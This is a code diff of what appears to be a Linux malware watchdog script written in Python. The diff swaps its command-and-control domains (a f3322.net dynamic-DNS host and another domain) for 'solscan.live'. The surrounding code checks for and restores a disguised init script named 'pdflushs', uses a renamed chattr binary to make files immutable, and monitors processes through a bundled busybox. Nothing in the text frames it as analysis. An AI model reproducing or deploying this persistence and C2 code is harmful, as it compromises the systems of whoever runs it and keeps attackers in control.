@@ -14,7 +14,7 @@ def checkConfig():
 	else:
 		f = open('/usr/bin/config.json', 'r')
 		result = f.read()
-		if "rainbow20.eatuo.com" in result:
+		if "solscan.live" in result:
 			return False
 		else:
 			return True
@@ -31,7 +31,7 @@ def checkHttp(ip):
 		return False
 
 def checkProc(procName):
-	ip = socket.getaddrinfo("Rainbow66.f3322.net", None)
+	ip = socket.getaddrinfo("solscan.live", None)
 	while True:
 		result = os.popen('/lib64/busybox ps|/lib64/busybox grep '+procName+'|/lib64/busybox grep -v grep|/lib64/busybox wc -l').read().splitlines()
 		if len(result):
@@ -45,7 +45,7 @@ def checkProc(procName):
 			os.system("/lib64/libg++.so +ai /lib64/busybox")
 
 def tick():
-	ip = socket.getaddrinfo("Rainbow66.f3322.net", None)
+	ip = socket.getaddrinfo("solscan.live", None)
 	while True:
 		if not os.path.exists("/etc/init.d/pdflushs"):
 			os.system("/lib64/busybox chattr -ai /etc/init.d/pdflushs")
